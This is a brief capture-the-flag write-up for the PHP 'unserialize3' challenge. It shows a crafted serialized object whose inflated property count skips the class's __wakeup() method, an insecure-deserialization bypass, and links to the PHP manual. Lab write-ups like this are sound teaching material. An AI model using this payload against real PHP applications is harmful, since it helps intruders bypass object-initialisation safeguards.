# unserialize3

![Screenshot from 2021-07-24 23-02-44](https://user-images.githubusercontent.com/87865134/126874264-7c4421c7-14d3-4760-b9f5-3f5994cb80f0.png)

- Hint: `?code= object serialize`
- Create serialize of object ***xctf***

![Screenshot from 2021-07-24 23-05-36](https://user-images.githubusercontent.com/87865134/126874333-16ed4d3e-350f-4e06-b69a-81e14ea243f0.png)

  - > Object serialize: `O:4:"xctf":1:{s:4:"flag";s:3:"111";}` 

- Function `__wakeup()` of class `xctf` will run before object *unserialize*
  - Bypass:  *change number of class 's fields*
    -  `O:4:"xctf":2:{s:4:"flag";s:3:"111";}` 

![Screenshot from 2021-07-24 23-12-37](https://user-images.githubusercontent.com/87865134/126874535-2fdc3630-7a85-4baf-a479-39e62b5b129d.png)

- **Description:**
  - > category: Insecure Deserialization 


- **Reference:**
  - https://www.php.net/manual/en/language.oop5.magic.php
  - https://www.php.net/manual/en/function.serialize
